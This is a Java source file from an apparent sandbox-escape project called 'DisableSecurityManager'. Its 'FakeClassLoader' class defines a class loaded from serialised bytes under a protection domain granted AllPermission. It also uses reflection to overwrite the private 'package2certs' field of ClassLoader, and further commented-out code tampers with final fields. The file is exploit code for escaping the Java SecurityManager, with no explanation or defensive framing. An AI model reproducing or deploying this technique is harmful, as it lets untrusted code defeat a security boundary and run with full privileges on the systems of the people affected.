package DisableSecurityManager;//import org.openjdk.jol.vm.VM;


import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.security.cert.CertificateFactory;
import java.util.Collection;
import java.util.Hashtable;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class FakeClassLoader extends ClassLoader implements Serializable {
  public FakeClassLoader() {
  }
  public static void doWork(FakeClassLoader fcl) throws Throwable {

    byte[] buffer = ObjectToByteArray.toByteArray(new DefaultFakeClassLoader());
    URL url = new URL("file:///");
    Certificate[] certs = new Certificate[0];
    Permissions perm = new Permissions();
    perm.add(new AllPermission());
    ProtectionDomain protectionDomain = new ProtectionDomain(
        new CodeSource(url, certs), perm);

    Class cls = fcl.defineClass("DisableSecurityManager.DefaultFakeClassLoader", buffer, 0,
        buffer.length, protectionDomain);
    cls.newInstance();
  }

  private static Certificate makeDummyCert() throws Exception {
    InputStream certificateInputStream = new FileInputStream("/home/centos/PL-chain.pem");
    BufferedInputStream bis = new BufferedInputStream(certificateInputStream);
    CertificateFactory certificateFactory = CertificateFactory.getInstance("X.509");
    return certificateFactory.generateCertificate(bis);
  }

  private static void use_reflection_to_set_vars(FakeClassLoader fcl)
      throws NoSuchFieldException, IllegalAccessException {
    Map<String, Certificate[]> packageMap = new ConcurrentHashMap<String, Certificate[]>();
    Certificate[] emptyCerts = new Certificate[0];
    packageMap.put("", emptyCerts);

    Field packageField = ClassLoader.class.getDeclaredField("package2certs");

//    Field packageType = Field.class.getDeclaredField("type");
//    AccessibleObject.setAccessible(
//        new AccessibleObject[]{packageField, packageType}, true);
//    packageType.set(packageField, Map<String, Certificate[]>);

    packageField.setAccessible(true);
    packageField.set(fcl, packageMap);

//    Field nocertsField = ClassLoader.class.getDeclaredField("nocerts");

////    Field modifiersField = Field.class.getDeclaredField("modifiers");
////    modifiersField.setAccessible(true);
////    modifiersField.setInt(nocertsField, nocertsField.getModifiers() & ~Modifier.FINAL);
//
//    nocertsField.setAccessible(true);
//    nocertsField.set(fcl, emptyCerts);


//    System.out.println(packageField.getType());
//    System.out.println(nocertsField.getType());
//
//    Map<String, Certificate[]> map = (Map<String, Certificate[]>) packageField.get(fcl);
//    Certificate[] nocerts = (Certificate[]) nocertsField.get(fcl);
//    Collection<Certificate[]> mapVals = map.values();
//    System.out.println(mapVals.toArray()[0]);
//    System.out.println(nocerts.length);
  }
}
